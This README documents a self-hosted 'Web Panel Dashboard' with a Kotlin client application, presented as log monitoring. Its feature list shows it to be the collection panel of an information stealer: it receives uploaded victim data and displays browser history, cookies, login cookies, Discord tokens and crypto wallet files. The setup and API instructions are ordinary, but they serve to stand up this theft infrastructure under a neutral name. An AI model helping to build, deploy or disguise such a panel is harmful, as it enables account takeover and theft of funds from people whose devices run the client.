# Web Panel Dashboard

A comprehensive web dashboard for monitoring and managing client logs, system information, browser data, and more.

## Features

- **Secure Authentication**: JWT-based authentication with bcrypt password hashing
- **Client Logs Management**: View, search, and manage client logs
- **System Information**: Display CPU, GPU, RAM, and OS information
- **Browser Data**: View browser history, cookies (with expiration status), and login cookies
- **Discord Tokens**: Extract and display Discord authentication tokens
- **Crypto Wallets**: Extract and download crypto wallet files and folders
- **Statistics Dashboard**: View comprehensive statistics and analytics
- **User Management**: Create users, change passwords, and manage access

## Prerequisites

- Node.js (v14 or higher)
- npm or yarn
- Kotlin (for client application)

## Installation

1. **Clone the repository**
   ```bash
   git clone <your-repo-url>
   cd webpanel
   ```

2. **Install backend dependencies**
   ```bash
   npm install
   ```

3. **Install frontend dependencies**
   ```bash
   cd client
   npm install
   cd ..
   ```

4. **Configure environment variables**
   ```bash
   cp .env.example .env
   ```
   
   Edit `.env` and set:
   - `JWT_SECRET`: A strong random string for JWT token signing
   - `PORT`: Server port (default: 3001)
   - `DEFAULT_ADMIN_USERNAME`: Initial admin username
   - `DEFAULT_ADMIN_PASSWORD`: Initial admin password (change after first login!)

5. **Build the frontend**
   ```bash
   cd client
   npm run build
   cd ..
   ```

## Running the Application

### Development Mode

1. **Start the backend server**
   ```bash
   npm start
   ```

2. **Start the frontend development server** (in a separate terminal)
   ```bash
   cd client
   npm start
   ```

   The frontend will be available at `http://localhost:3000`
   The backend API will be available at `http://localhost:3001`

### Production Mode

1. **Build the frontend**
   ```bash
   cd client
   npm run build
   cd ..
   ```

2. **Start the server**
   ```bash
   npm start
   ```

   The application will be available at `http://localhost:3001`

## Default Credentials

On first run, a default admin user is created:
- **Username**: `admin` (or value from `DEFAULT_ADMIN_USERNAME` in `.env`)
- **Password**: `admin` (or value from `DEFAULT_ADMIN_PASSWORD` in `.env`)

**⚠️ IMPORTANT**: Change the default password immediately after first login!

## User Management

### Change Password

You can change your password using the API:

```bash
curl -X POST http://localhost:3001/api/auth/change-password \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"oldPassword": "oldpass", "newPassword": "newpass"}'
```

### Create New User

```bash
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"username": "newuser", "password": "password123"}'
```

## API Endpoints

### Authentication
- `POST /api/auth/login` - Login and receive JWT token
- `POST /api/auth/logout` - Logout (requires authentication)
- `POST /api/auth/register` - Create new user (requires authentication)
- `POST /api/auth/change-password` - Change password (requires authentication)

### Logs
- `GET /api/logs` - Get all logs
- `GET /api/logs/:logId` - Get specific log
- `POST /api/logs/delete` - Delete logs (requires log IDs array)
- `POST /api/upload` - Upload new log data

### Statistics
- `GET /api/stats` - Get basic statistics
- `GET /api/statistics` - Get detailed statistics

## Security Notes

1. **JWT Secret**: Always use a strong, random JWT secret in production
2. **Password Security**: Passwords are hashed using bcrypt with salt rounds of 10
3. **Token Expiration**: JWT tokens expire after 24 hours
4. **HTTPS**: Use HTTPS in production to protect authentication tokens
5. **Environment Variables**: Never commit `.env` file to version control

## File Structure

```
webpanel/
├── server.js              # Express backend server
├── package.json           # Backend dependencies
├── .env                   # Environment variables (not in git)
├── .env.example          # Example environment variables
├── users.json            # User database (not in git)
├── logs.json             # Log storage (not in git)
├── client/               # React frontend
│   ├── src/
│   │   ├── components/   # React components
│   │   ├── pages/        # Page components
│   │   └── theme.js      # Material-UI theme
│   ├── public/
│   └── package.json
└── README.md
```

## Troubleshooting

### "Failed to connect to server"
- Ensure the backend server is running on port 3001
- Check that the frontend proxy is configured correctly (in `client/package.json`)

### Authentication errors
- Verify JWT_SECRET is set in `.env`
- Check that `users.json` exists and contains valid user data
- Ensure tokens haven't expired (24 hour expiration)

### Build errors
- Clear `node_modules` and reinstall: `rm -rf node_modules && npm install`
- Ensure Node.js version is 14 or higher

## License

[Your License Here]

## Support

For issues and questions, please open an issue on GitHub.

